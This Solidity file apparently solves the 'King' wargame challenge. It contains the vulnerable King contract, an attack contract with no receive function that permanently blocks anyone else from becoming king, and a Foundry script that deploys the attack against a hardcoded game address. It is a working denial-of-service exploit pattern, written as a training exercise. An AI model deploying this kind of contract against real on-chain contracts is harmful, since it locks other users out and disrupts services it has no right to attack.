// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";


contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract KingAttack {
    constructor (address payable target) payable {
        uint prize = King(target).prize();
        (bool success, ) = target.call{value: prize}("");

        require(success, "Failed");
    }

    //the absence of a receive function in the Attack contract makes it unable to receive funds upon change of kingship.
    //thereby reverting the receive function in the king contract and disrupting the process there by ensuring out attack contract is always king!
} 

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        vm.startBroadcast();
        address gameAddress = 0x0D1604e026197963002AD14650503F1c7b2904cD;

        KingAttack attacker = new KingAttack{value: 0.01 ether}(payable(gameAddress));
        vm.stopBroadcast();
    }
}